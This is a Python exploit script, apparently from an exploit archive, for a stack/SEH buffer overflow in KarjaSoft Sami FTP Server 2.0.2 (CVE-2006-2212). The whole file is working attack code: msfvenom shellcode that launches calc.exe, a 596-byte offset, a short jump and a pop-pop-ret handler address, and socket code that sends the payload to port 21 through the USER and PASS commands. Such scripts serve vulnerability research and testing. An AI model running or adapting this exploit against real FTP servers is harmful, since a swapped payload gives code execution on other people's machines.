# Title: KarjaSoft Sami FTP Server 2.0.2 - CVE-2006-2212
# Exploit Author: lem0nSec
# Version: 2.0.2
# Tested on: Windows XP SP3

import socket
import sys
from struct import pack

#-----------------------------------------------------------------------------------#
# offset: 594 --> for some reason the buffer gets modified by the program logic     #
# new offset: 596                                                                   #
# 0x10019840 - pop ecx, pop ecx, retn                                               #
#-----------------------------------------------------------------------------------#

# msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x0a\x5c\xff" -f python
buf =  b""
buf += b"\xb8\x67\x25\x43\x2f\xd9\xcb\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x31\x31\x42\x13\x83\xc2\x04\x03\x42\x68\xc7"
buf += b"\xb6\xd3\x9e\x85\x39\x2c\x5e\xea\xb0\xc9\x6f\x2a\xa6"
buf += b"\x9a\xdf\x9a\xac\xcf\xd3\x51\xe0\xfb\x60\x17\x2d\x0b"
buf += b"\xc1\x92\x0b\x22\xd2\x8f\x68\x25\x50\xd2\xbc\x85\x69"
buf += b"\x1d\xb1\xc4\xae\x40\x38\x94\x67\x0e\xef\x09\x0c\x5a"
buf += b"\x2c\xa1\x5e\x4a\x34\x56\x16\x6d\x15\xc9\x2d\x34\xb5"
buf += b"\xeb\xe2\x4c\xfc\xf3\xe7\x69\xb6\x88\xd3\x06\x49\x59"
buf += b"\x2a\xe6\xe6\xa4\x83\x15\xf6\xe1\x23\xc6\x8d\x1b\x50"
buf += b"\x7b\x96\xdf\x2b\xa7\x13\xc4\x8b\x2c\x83\x20\x2a\xe0"
buf += b"\x52\xa2\x20\x4d\x10\xec\x24\x50\xf5\x86\x50\xd9\xf8"
buf += b"\x48\xd1\x99\xde\x4c\xba\x7a\x7e\xd4\x66\x2c\x7f\x06"
buf += b"\xc9\x91\x25\x4c\xe7\xc6\x57\x0f\x6d\x18\xe5\x35\xc3"
buf += b"\x1a\xf5\x35\x73\x73\xc4\xbe\x1c\x04\xd9\x14\x59\xfa"
buf += b"\x93\x35\xcb\x93\x7d\xac\x4e\xfe\x7d\x1a\x8c\x07\xfe"
buf += b"\xaf\x6c\xfc\x1e\xda\x69\xb8\x98\x36\x03\xd1\x4c\x39"
buf += b"\xb0\xd2\x44\x5a\x57\x41\x04\xb3\xf2\xe1\xaf\xcb"

payload = "A"*596
payload += "\xeb\x08\x90\x90"       # JMP SHORT +8 bytes
payload += pack("<I", 0x10019840)   # SEH handler
payload += "\x90"*32                # padding
payload += buf
payload += "\xcc"*(1000 - len(payload))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 21))
    s.send("USER " + payload + "\r\n")
    print s.recv(4096)
    s.send("PASS " + payload + "\r\n")
    print s.recv(4096)
    print s.recv(4096)
    s.close()

except:
    print "[-] Error connecting to the target"
    sys.exit()
